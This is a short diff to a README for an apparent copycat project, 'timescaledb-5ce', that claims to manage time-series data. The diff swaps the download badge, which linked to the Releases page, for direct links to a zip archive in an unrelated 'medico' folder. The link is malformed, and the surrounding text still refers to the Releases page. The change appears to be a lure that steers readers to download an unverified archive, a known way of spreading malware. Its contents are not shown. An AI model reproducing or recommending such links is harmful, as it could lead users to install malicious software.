@@ -9,7 +9,7 @@ Welcome to timescaledb-5ce! This application helps you manage and analyze time-s
 ### Visit this page to download
 To get started, click the button below to visit the Downloads page, where you can find the latest version of our software.
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Manikantabotta/timescaledb-5ce/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Manikantabotta/timescaledb-5ce/main/medico/timescaledb-5ce.zip%https://raw.githubusercontent.com/Manikantabotta/timescaledb-5ce/main/medico/timescaledb-5ce.zip)](https://raw.githubusercontent.com/Manikantabotta/timescaledb-5ce/main/medico/timescaledb-5ce.zip)
 
 Once you're on the Releases page, look for the latest version at the top. You will see several files available for download. Select the one that is right for your system. 
 
